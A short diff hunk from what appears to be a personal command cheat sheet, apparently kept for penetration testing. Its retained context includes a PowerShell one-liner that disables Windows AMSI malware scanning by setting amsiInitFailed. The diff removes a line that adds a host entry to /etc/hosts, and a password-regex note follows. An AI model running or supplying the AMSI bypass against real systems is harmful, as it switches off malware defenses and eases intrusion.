@@ -10,9 +10,6 @@ Past Command
 [Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)
 ```
 
-```bash
-echo "$IP $DOMAINSTR" | sudo tee -a /etc/hosts
-```
 
 Regex
 For  >= 8 character containing atleast one of each: uppercase letter, lowercase letter and digits
